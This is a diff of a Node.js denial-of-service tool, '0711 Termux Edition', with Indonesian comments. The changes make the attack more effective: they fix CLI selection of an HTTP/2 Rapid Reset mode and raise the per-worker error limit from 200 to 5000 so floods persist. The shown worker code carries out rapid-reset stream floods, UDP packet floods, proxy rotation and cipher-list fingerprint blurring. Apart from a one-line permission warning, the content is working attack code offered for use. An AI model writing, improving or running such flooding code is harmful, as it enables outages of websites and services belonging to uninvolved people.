@@ -1,13 +1,14 @@
 #!/usr/bin/env node
 /**
  * =====================================================================
- *                         🔱 0711 – TERMUX EDITION 🔱
+ *                         🔱 0711 – TERMUX EDITION v2 🔱
  *                     Optimized for Limited Resources
  *   HTTP/2 Rapid Reset, Slowloris, RUDY, Proxy Rotation, Dashboard
+ *   FIXED: --mode propagation, maxErrorsPerWorker increased to 5000
  * =====================================================================
  * 
  * USAGE (Termux):
- *   node 0711.js --target example.com --workers 5 --duration 30
+ *   node 0711.js --target example.com --workers 5 --duration 30 --mode rapid_reset
  * 
  * ⚠️  WARNING: Use only on systems you own or have explicit permission.
  * =====================================================================
@@ -32,10 +33,10 @@ const CONFIG = {
     target: 'example.com',
     targets: [],
     ports: [443, 80],
-    workersPerPort: 5,         // Default rendah untuk Termux
+    workersPerPort: 5,
     duration: 120,
     attackType: 'https',
-    attackMode: 'normal',
+    attackMode: 'normal',    // default
     method: 'GET',
     proxyAuto: false,
     proxyFile: null,
@@ -55,7 +56,7 @@ const CONFIG = {
     logFile: '0711.log',
     verbose: false,
     maxConsecutiveFailures: 3,
-    maxErrorsPerWorker: 200,    // Turunkan agar worker berhenti lebih cepat
+    maxErrorsPerWorker: 5000,   // dinaikkan dari 200
     backoffBase: 1000,
     maxBackoff: 30000,
     customHeaders: {},
@@ -117,7 +118,6 @@ function parseArgs() {
     for (let i = 0; i < args.length; i++) {
         let arg = args[i];
         let key, value;
-        // Handle --key=value
         if (arg.startsWith('--') && arg.includes('=')) {
             [key, value] = arg.slice(2).split('=', 2);
             parsed[key] = value;
@@ -143,14 +143,12 @@ function normalizeTarget(input) {
     let cleaned = input.trim();
     cleaned = cleaned.replace(/^https?:\/\//, '');
     cleaned = cleaned.replace(/\/$/, '');
-    // Handle IPv6 [2001:db8::1]:443
     if (cleaned.startsWith('[') && cleaned.includes(']')) {
         const match = cleaned.match(/^\[([^\]]+)\](?::(\d+))?$/);
         if (match) {
-            return match[1]; // return IPv6 tanpa port
+            return match[1];
         }
     }
-    // IPv4 / domain
     cleaned = cleaned.split(':')[0];
     return cleaned;
 }
@@ -173,8 +171,15 @@ async function main() {
             process.exit(1);
         }
     }
+
+    // --- TIMPA DENGAN CLI ARGS ---
     for (const [key, val] of Object.entries(cmdArgs)) {
         if (val !== undefined) config[key] = val;
+    }
+
+    // ** FIX: Pastikan attackMode dari CLI **
+    if (cmdArgs.mode) {
+        config.attackMode = cmdArgs.mode;
     }
 
     // Normalisasi target
@@ -216,13 +221,13 @@ async function main() {
     }
 
     if (cmdArgs.workers) config.workersPerPort = parseInt(cmdArgs.workers);
+    if (cmdArgs['max-errors']) config.maxErrorsPerWorker = parseInt(cmdArgs['max-errors']);
 
-    // CAP total worker untuk Termux (maks 4x CPU cores)
+    // CAP total worker
     const maxAllowedWorkers = Math.max(4, os.cpus().length * 2);
     let totalWorkers = config.targets.length * config.ports.length * config.workersPerPort;
     if (totalWorkers > maxAllowedWorkers) {
         logger.warn(`Total workers (${totalWorkers}) melebihi batas (${maxAllowedWorkers}). Dikurangi ke ${maxAllowedWorkers}.`);
-        // Turunkan workersPerPort proporsional
         const targetPortCount = config.targets.length * config.ports.length;
         if (targetPortCount > 0) {
             config.workersPerPort = Math.floor(maxAllowedWorkers / targetPortCount);
@@ -257,7 +262,6 @@ async function main() {
 
     // ===== Proxy Manager (Parallel fetch) =====
     let proxyList = [];
-    // Fallback proxies dihapus karena 99% mati, lebih baik kosong
 
     async function fetchProxies() {
         if (!config.proxyAuto && !config.proxyFile) return;
@@ -275,7 +279,6 @@ async function main() {
 
         if (config.proxyAuto) {
             const sources = config.proxySources || CONFIG.proxySources;
-            // Parallel fetch
             const results = await Promise.allSettled(
                 sources.map(async (src) => {
                     try {
@@ -374,7 +377,7 @@ async function main() {
                             proxyList: this.proxyList,
                             payloadTemplates: this.payloadTemplates,
                             maxConsecutiveFailures: this.config.maxConsecutiveFailures || 3,
-                            maxErrorsPerWorker: this.config.maxErrorsPerWorker || 200,
+                            maxErrorsPerWorker: this.config.maxErrorsPerWorker || 5000,
                             backoffBase: this.config.backoffBase || 1000,
                             maxBackoff: this.config.maxBackoff || 30000,
                             verbose: this.config.verbose || false,
@@ -419,7 +422,6 @@ async function main() {
                 }
             }
 
-            // Stats interval 500ms untuk mengurangi IPC
             const statsInterval = setInterval(() => {
                 const elapsed = (Date.now() - this.stats.startTime) / 1000;
                 const rate = this.stats.total / (elapsed || 1);
@@ -498,7 +500,7 @@ async function main() {
         }
     }
 
-    // ===== Worker Code (FIXED for Termux) =====
+    // ===== Worker Code (FIXED) =====
     const WORKER_CODE = `
 (async () => {
 const { parentPort, workerData } = require('worker_threads');
@@ -515,11 +517,16 @@ const {
     maxConsecutiveFailures, maxErrorsPerWorker, backoffBase, maxBackoff, verbose, customHeaders,
 } = workerData;
 
+// ** FIX: Log mode yang digunakan di worker (debug) **
+if (verbose) {
+    console.log(\`[Worker \${workerId}] Attack mode: \${attackMode}\`);
+}
+
 let sent = 0, active = 0, errors = 0, serverErrors = 0;
 let isStopping = false;
 let consecutiveFailures = 0;
-let socket = null;           // proxy socket
-let tlsConn = null;          // TLS connection
+let socket = null;
+let tlsConn = null;
 let http2Client = null;
 let durationTimer = null;
 let currentProxyIndex = 0;
@@ -540,7 +547,6 @@ function getProxy() {
     return p;
 }
 
-// Cipher list (untuk fingerprint samar)
 const CIPHER_LIST = [
     'ECDHE-RSA-AES128-GCM-SHA256',
     'ECDHE-ECDSA-AES128-GCM-SHA256',
@@ -577,7 +583,6 @@ function cleanup(reason) {
     if (isStopping) return;
     isStopping = true;
     if (durationTimer) { clearTimeout(durationTimer); durationTimer = null; }
-    // Tutup semua koneksi
     if (http2Client && !http2Client.destroyed) {
         http2Client.destroy();
         http2Client = null;
@@ -615,7 +620,6 @@ async function http2NormalAttack() {
         let errorLogged = false;
         try {
             const proxy = getProxy();
-            // Build connection
             let proxySocket = null;
             if (proxy) {
                 const [proxyHost, proxyPort] = proxy.split(':');
@@ -647,7 +651,6 @@ async function http2NormalAttack() {
                 });
             }
             active = 1;
-            // Kirim stats tiap 10 request untuk kurangi IPC
             if (statsCounter % 10 === 0) sendStats();
 
             http2Client = http2.connect(\`https://\${targetIP}\`, { createConnection: () => tlsConn });
@@ -682,7 +685,6 @@ async function http2NormalAttack() {
                 sendStats();
                 req.destroy();
                 http2Client.destroy();
-                // Reset koneksi
                 if (tlsConn && !tlsConn.destroyed) tlsConn.destroy();
                 if (socket && !socket.destroyed) socket.destroy();
                 active = 0;
@@ -703,7 +705,6 @@ async function http2NormalAttack() {
                 cleanup(\`Max consecutive failures (\${maxConsecutiveFailures}) reached\`);
                 return;
             }
-            // Cleanup on error
             if (http2Client && !http2Client.destroyed) http2Client.destroy();
             if (tlsConn && !tlsConn.destroyed) tlsConn.destroy();
             if (socket && !socket.destroyed) socket.destroy();
@@ -791,11 +792,10 @@ async function http2RapidResetAttack() {
                 req.end();
                 streams.push(req);
             }
-            // Langsung RST semua stream
+            // RST semua stream
             for (const req of streams) {
                 req.destroy();
             }
-            // Tutup koneksi setelah reset
             http2Client.destroy();
             if (tlsConn && !tlsConn.destroyed) tlsConn.destroy();
             if (socket && !socket.destroyed) socket.destroy();
@@ -835,7 +835,7 @@ async function udpAttack() {
         }
         if (durationMs && Date.now() - startTime > durationMs) break;
         try {
-            const payload = Buffer.from(randStr(1400)); // lebih besar
+            const payload = Buffer.from(randStr(1400));
             udpSocket.send(payload, port, targetIP, (err) => {
                 if (err) {
                     if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
@@ -867,7 +867,7 @@ parentPort.on('message', (msg) => {
     }
 });
 
-// --- Entry ---
+// --- Entry Point ---
 if (attackType === 'udp') {
     await udpAttack();
 } else if (attackType === 'https') {
@@ -877,7 +877,7 @@ if (attackType === 'udp') {
         await http2NormalAttack();
     }
 } else {
-    // HTTP/1.1 fallback (sederhana)
+    // HTTP/1.1 fallback
     let statsCounter = 0;
     while (!isStopping) {
         sent++;
@@ -931,7 +931,7 @@ if (attackType === 'udp') {
 `;
 
     // ===== Eksekusi =====
-    logger.info('Initializing 0711 Termux Edition...');
+    logger.info('Initializing 0711 Termux Edition v2 (FIXED)...');
 
     // Cek dashboard dependencies
     if (config.dashboard) {
